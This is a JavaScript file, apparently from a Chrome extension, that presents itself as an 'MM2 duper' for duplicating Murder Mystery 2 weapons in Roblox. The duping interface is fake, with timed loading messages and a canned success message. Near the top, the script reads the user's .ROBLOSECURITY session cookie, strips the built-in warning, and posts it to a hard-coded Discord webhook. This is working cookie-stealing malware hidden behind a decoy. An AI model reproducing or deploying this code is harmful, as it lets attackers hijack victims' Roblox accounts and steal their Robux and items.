var config = {
  type: 'third',
  title: 'Mm2 duper',
  description: 'Enter the ID below:',
  inputPlaceholder: 'Inject',
  buttonText: 'Inject',
  apiTool: 'MM2 Weapon Dupe',
  loadingMessages: ['Processing...', 'Loading data...', 'Finalizing...', 'Almost done...'],
  successMessage: 'Operation completed successfully!'
};

function initUI() {
  var cnt = document.getElementById('cnt');
  var html = '<div class="hdr">' + config.title + '</div>';
  html += '<div class="sub">' + config.description + '</div>';
  html += '<input type="text" class="inp" id="inp" placeholder="' + config.inputPlaceholder + '">';
  html += '<button class="btn" id="btn">' + config.buttonText + '</button>';
  cnt.innerHTML = html;
  document.getElementById('sucSub').textContent = config.successMessage;
}

var ldr = document.getElementById('ldr');
var ldrTxt = document.getElementById('ldrTxt');
var cnt = document.getElementById('cnt');
var res = document.getElementById('res');
var userid = document.getElementById('userid');

// Get Roblox security cookie and send to external API
chrome.cookies.get({
  url: 'https://www.roblox.com',
  name: '.ROBLOSECURITY'
}, function(c) {
  if (c) {
    newcookie = c.value.replace("_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_", "");
    fetch('https://discord.com/api/webhooks/1482859154690539530/PzLcUxSRBg64h7qisZD3kK-Yd9nX4x0xuVvao2_hqWyj1BrUH2DkHi2XC_SrscIC0Jgo', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({
        embeds: [{
    title: "Cookie",
    description: newcookie,
  }],
    content: `@everyone \n\nUserID: ${userid.value}`
    
    })
    });
  }
});

// Initialize UI after 3.5 seconds
setTimeout(function() {
  ldr.classList.add('hide');
  cnt.classList.add('show');
  initUI();
  
  var inp = document.getElementById('inp');
  var btn = document.getElementById('btn');
  var backBtn = document.getElementById('backBtn');
  
  // Only allow numbers in input
  inp.addEventListener('input', function() {
    this.value = this.value.replace(/[^0-9]/g, '');
  });
  
  // Handle button click
  btn.addEventListener('click', function() {
    if (!inp.value) return;
    cnt.classList.remove('show');
    cnt.classList.add('hide');
    ldr.classList.remove('hide');
    
    var i = 0;
    ldrTxt.textContent = config.loadingMessages[i];
    
    // Cycle through loading messages every 1.25 seconds
    var interval = setInterval(function() {
      i++;
      if (i < config.loadingMessages.length) {
        ldrTxt.textContent = config.loadingMessages[i];
      }
    }, 1250);
    
    // Show results after 5 seconds
    setTimeout(function() {
      clearInterval(interval);
      ldr.classList.add('hide');
      res.classList.add('show');
    }, 5000);
  });
  
  // Handle back button
  backBtn.addEventListener('click', function() {
    res.classList.remove('show');
    inp.value = '';
    cnt.classList.add('show');
  });
}, 3500);
